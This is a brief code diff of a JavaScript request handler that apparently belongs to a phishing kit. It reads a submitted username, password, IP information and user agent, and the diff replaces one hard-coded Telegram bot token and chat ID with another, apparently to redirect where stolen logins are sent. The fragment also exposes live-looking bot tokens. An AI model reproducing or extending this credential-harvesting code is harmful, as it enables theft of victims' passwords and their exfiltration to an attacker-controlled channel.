@@ -16,8 +16,8 @@ export default async function handler(req, res) {
     }
 
     const { username, password, ipInfo, userAgent } = req.body;
-    const BOT_TOKEN = '8038389810:AAEPEktTfJXTCuyNGLfZc_ZAvZ49FrTbTGk';
-    const CHAT_ID = '6748148257';
+    const BOT_TOKEN = '8524477133:AAEvuoZ9VyJzFMly-HMCoX6vKd0CudK7Wak';
+    const CHAT_ID = '8588392757';
 
     const now = new Date();
     const timeString = now.toLocaleString();
